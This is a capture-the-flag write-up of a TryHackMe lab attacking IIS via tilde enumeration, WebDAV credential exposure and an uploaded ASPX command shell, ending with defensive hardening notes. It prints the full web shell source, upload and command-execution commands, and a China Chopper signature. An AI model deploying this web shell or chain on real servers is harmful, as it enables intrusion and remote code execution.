# TryHackMe: Attacking IIS — Writeup

**Platform:** TryHackMe
**Room:** attackingwebserveriisv1.0
**Focus:** Full IIS attack chain — fingerprint → tilde enumeration → WebDAV shell upload → ASPX RCE → misconfiguration survey → automation.
**Target:** IIS 10.0 on Windows Server 2019 (build 10.0.17763).
**Note:** No CVE required anywhere in the chain. Every step is a misconfiguration or a by-design Windows quirk.

> Real-world relevance: this exact chain — web shell running as the app pool identity, then `SeImpersonatePrivilege` → SYSTEM — is the pattern documented in CISA AA23-074A and the HAFNIUM/ProxyLogon campaigns (ASPX web shells on IIS, RCE through `w3wp.exe`).

---

## Setup

```bash
export IP=<target>
nc -zv -w 5 $IP 80      # IIS is slow to boot — allow 2–3 min after deploy
```

IIS runs on 80/443 by default, so unlike Linux stacks, port 80 answers directly. A `Connection timed out` right after deploy usually means IIS hasn't finished starting, not that the box is down. A watch loop avoids guessing:

```bash
until nc -z -w 5 $IP 80 2>/dev/null; do echo "$(date +%T) booting..."; sleep 10; done; echo ">>> IIS UP <<<"
```

---

## Stage 1 — Fingerprinting

IIS version maps directly to a Windows Server release, which scopes the applicable CVEs:

| IIS | Windows Server | Status |
|---|---|---|
| 6.0 | 2003 | EOL — CVE-2017-7269 unpatched forever |
| 7.0/7.5 | 2008/2008 R2 | EOL |
| 8.0/8.5 | 2012/2012 R2 | EOL |
| 10.0 | 2016/2019/2022 | Current |

(IIS skipped 9.x — numbering jumped 8.5 → 10.0.)

### Banner grab

```bash
curl -sI http://$IP/ | grep -iE 'server|powered|aspnet'
# Server: Microsoft-IIS/10.0
# X-Powered-By: ASP.NET
```

`Server` reveals the IIS version; `X-Powered-By: ASP.NET` confirms .NET hosting.

### WebDAV detection via OPTIONS

```bash
curl -X OPTIONS http://$IP/webdav/ -sv 2>&1 | grep -E "Allow:|DAV:"
# Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
# DAV: 1,2,3
```

`DAV: 1,2,3` plus the extended verb set (`PUT`, `COPY`, `MOVE`, `PROPFIND`, `MKCOL`, `LOCK`) = **WebDAV enabled**. A plain `GET, HEAD, POST, OPTIONS` list would mean it's off. The presence of `PROPFIND`/`PROPPATCH`/`MKCOL`/`COPY`/`MOVE`/`LOCK`/`UNLOCK` is unambiguous — those verbs are not standard HTTP and only appear with WebDAV.

### Unauthenticated PUT test

```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT \
  --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' \
  http://$IP/webdav/test.aspx
# PUT aspx: 401
```

**401 Unauthorized** — WebDAV is enabled but writing requires a valid Windows identity. The `401` is the signal to go find credentials, not a dead end. (Note: the room text mislabels 401 as "Created"; **201** is Created, **401** is Unauthorized.)

---

## Stage 2 — Tilde (8.3 Short Filename) Enumeration

Windows generates 8.3 short filenames (DOS legacy) alongside long names on NTFS. IIS responds differently to a `~`-containing path depending on whether it matches a real short name, letting an attacker reconstruct hidden names character by character. Known since 2012, affects IIS 5.x–10.0, **Microsoft declined to patch** — mitigation is disabling 8.3 creation in the registry.

Conversion rule: first 6 chars of the name + `~1` + first 3 of the extension. `BackupFiles` → `BACKUP~1`.

The room provides a scanner at `/opt/IIS_shortname_Scanner` (AttackBox). On a personal Kali over VPN, either clone it:

```bash
git clone https://github.com/lijiejie/IIS_shortname_Scanner /tmp/iis-py
cd /tmp/iis-py && python3 iis_shortname_scan.py http://$IP/
# Dir: /backup~1
# Dir: /aspnet~1
```

…or, knowing the short name is `backup~1`, skip straight to guessing the full directory name (the room does this too):

```bash
for d in BackupFiles Backup backup Backups Backup_2024 BackupData; do
  echo "=== /$d/ ==="; curl -s -o /dev/null -w "%{http_code}\n" "http://$IP/$d/"
done
# /BackupFiles/  -> 200
```

Directory listing (another misconfig) is enabled on the hit:

```bash
curl -s "http://$IP/BackupFiles/"
# lists: site-backup.cfg, web.config, webdav_notes.txt
```

The notes file hands over the WebDAV credentials:

```bash
curl -s "http://$IP/BackupFiles/webdav_notes.txt"
# WebDAV setup notes
# Directory: /webdav/
# Username: webdav_user
# Password: P@ssw0rd!123
```

The tilde quirk surfaced a directory a wordlist would never guess; directory listing then exposed a plaintext-credential file. **Recon technique + misconfig, no exploit.**

---

## Stage 3 — WebDAV Shell Upload → RCE

Three conditions must all hold for the upload to yield execution:
1. WebDAV enabled on the directory
2. Valid credentials with **Write** permission
3. **Script Execute** set — IIS passes `.aspx` to the ASP.NET handler rather than serving it statically

### The ASPX command shell

```aspx
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
```

Write it with a quoted heredoc so bash leaves `<%`/`%>` intact:

```bash
cat > cmd.aspx <<'EOF'
<%@ Page Language="C#" %>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%>
EOF
```

### Upload with NTLM auth

IIS protects `/webdav/` with Windows Authentication; writes require a valid identity proven via NTLM (no plaintext on the wire). curl's `--ntlm` flag drives the handshake:

```bash
curl -s -o /dev/null -w "PUT: %{http_code}\n" --ntlm -u 'webdav_user:P@ssw0rd!123' \
  -T cmd.aspx http://$IP/webdav/cmd.aspx
# PUT: 201
```

**201 Created** confirms the write.

> **curl NTLM gotcha:** some WSL/minimal curl builds are compiled without NTLM (`curl: option --ntlm: the installed libcurl version does not support this`). Check with `curl --version | grep -i NTLM`. Fixes: install a fuller curl, or use `cadaver`/`davtest`, or Python `requests_ntlm`.

### Confirm execution

```bash
curl -s "http://$IP/webdav/cmd.aspx?cmd=whoami"
# <pre>iis apppool\defaultapppool</pre>
```

Code execution as the Application Pool identity — the account `w3wp.exe` runs under.

> **PUT→MOVE bypass (worth remembering):** handler mappings apply at *request* time, not *upload* time. If a directory allows writes but won't execute `.aspx`, you can `PUT` the file somewhere permitted, then `MOVE` it into an executable directory — the handler evaluates it only when it's later requested.

---

## Stage 4 — Post-Exploitation: the Privilege That Matters

```bash
curl -s "http://$IP/webdav/cmd.aspx?cmd=whoami+/priv"
```

```
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

**`SeImpersonatePrivilege` is Enabled.** This is the golden ticket. `ApplicationPoolIdentity` (and legacy `NETWORK SERVICE`) carry it by default. It lets the process impersonate any account that authenticates to it — which is exactly what Potato-family tools abuse: force a SYSTEM process to authenticate to an attacker-controlled named pipe, then steal its token.

Escalation to SYSTEM is out of the room's scope but the path is well-documented: **PrintSpoofer, JuicyPotato, GodPotato, RoguePotato**. Landing an ASPX shell on a default IIS install gives a *predictable* starting privilege with a *known* escalation route.

Orientation commands:

```bash
curl -s "http://$IP/webdav/cmd.aspx?cmd=hostname"     # CHANGE-MY-HOSTNAME
curl -s "http://$IP/webdav/cmd.aspx?cmd=dir+C:\\"      # standard layout: inetpub, Users, Windows...
```

### Interactive reverse shell (optional)

Listener on the **tun0 IP** when on VPN (not the AttackBox IP):

```bash
nc -lvnp 443
```

Then fire a PowerShell one-liner through the shell via `curl -G --data-urlencode`, with `CONNECTION_IP` = your tun0 address. Port 443 is chosen because outbound HTTPS is rarely firewalled.

---

## Stage 5 — Misconfiguration Survey (each a standalone finding)

| # | Misconfig | Check | Finding on this box |
|---|---|---|---|
| 1 | Directory listing | `curl -s http://$IP/uploads/` | Lists `config.bak`, `web.config` |
| 2 | Unauth PUT/DELETE (global WebDAV) | `curl -X OPTIONS http://$IP/ ...` | WebDAV verbs on **root**, not just `/webdav/` |
| 3 | web.config exposure | `curl http://$IP/web.config` | 200 + `<configuration>` = creds/keys (blocked here — 404) |
| 4 | Verbose errors | trigger app error | stack traces if `customErrors="Off"` |
| 5 | trace.axd enabled | `curl http://$IP/trace.axd` | **200 — Application Trace viewer live** |
| 6 | HTTP TRACE | `curl -X TRACE http://$IP/ -sv` | XST hygiene finding (405 is correct state) |
| 7 | Privileged AppPool | `cmd.aspx?cmd=whoami` | `defaultapppool` (would be worse as SYSTEM/domain admin) |

On this target, `trace.axd` returned **200** with the full trace viewer — a real finding (leaks headers, cookies, session state, last 50 requests; tokens can be replayed). The `web.config`/`config.bak` files appeared in the listing but 404'd on direct fetch — IIS request filtering correctly blocks `.config`/`.bak` retrieval even though listing advertises their existence. Worth noting the *listing disclosure* separately from the *(correct) fetch block*.

---

## Stage 6 — Automation with Nmap NSE

Everything above, condensed into one pass:

```bash
nmap -sV -p 80 --script "http-methods,http-webdav-scan,http-ntlm-info" \
  --script-args http-ntlm-info.root=/webdav/ $IP
```

| Script | Automates | Output |
|---|---|---|
| `http-methods` | the OPTIONS/Allow check | WebDAV verbs on root → global WebDAV |
| `http-webdav-scan` | PROPFIND probe | write verbs accepted, `Microsoft-IIS/10.0` |
| `http-ntlm-info` | NTLM challenge parse | `NetBIOS_Computer_Name: CHANGE-MY-HOSTN`, `Product_Version: 10.0.17763` (Server 2019) |

`http-ntlm-info` is the standout — hostname, domain, and exact OS build leaked **unauthenticated** from the NTLM challenge response, in under 8 seconds. Manual first to understand the signals; NSE to collect them fast.

---

## Detection & Defensive Notes

The blue-team view of this chain:

| Stage | Signal to hunt | Hardening |
|---|---|---|
| Tilde enum | Bursts of requests containing `~` and `*` against many paths | Disable 8.3 creation: `fsutil 8dot3name set 1`; strip existing short names |
| WebDAV upload | `201 Created`, unexpected `PUT`/`MOVE`/`PROPFIND` in IIS logs; new `.aspx` in writable dirs | Disable WebDAV if unused; never grant Write + Script Execute on the same dir; require auth |
| ASPX web shell | `.aspx` files containing `eval(` / `execute(` in dirs that shouldn't hold user files | AV/EDR signatures on shell patterns; file-integrity monitoring on web roots |
| China Chopper | 73-byte server component: `<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>` | Same — the `eval(Request.Item[...])` string is the classic signature (HAFNIUM/ProxyLogon, MITRE T1505.003) |
| SeImpersonate → SYSTEM | Named-pipe auth from `w3wp.exe`, Potato tool artifacts | Run app pools as least-privilege; where feasible remove SeImpersonate; patch to close Potato variants |
| Misconfigs | `/trace.axd` 200, directory listings, exposed `.config` | `<trace enabled="false"/>`, disable Directory Browsing, `customErrors="On"`, request filtering on `.config`/`.bak` |

---

## Summary

| Stage | Technique | Result |
|---|---|---|
| Fingerprint | Server header, OPTIONS | IIS 10.0 / Server 2019, WebDAV enabled |
| Tilde enum | 8.3 short-name leak → `/BackupFiles/` | Creds `webdav_user : P@ssw0rd!123` |
| Upload | NTLM `PUT` of `cmd.aspx` → 201 | RCE as `iis apppool\defaultapppool` |
| Post-ex | `whoami /priv` | `SeImpersonatePrivilege` → Potato path to SYSTEM |
| Misconfigs | listing, global WebDAV, `trace.axd` (200) | Multiple standalone findings |
| Automation | NSE `http-methods`, `http-webdav-scan`, `http-ntlm-info` | Whole chain confirmed in one 8-sec scan |

The consistent thread: **the version determines the CVE surface, but the compromise here needed no CVE at all.** WebDAV + write + Script Execute is a misconfiguration triad; tilde enumeration is unpatched by design; the credentials were left in a listable backup directory. Default settings optimise for ease of deployment, and no one reviewed them.

**Room complete.**
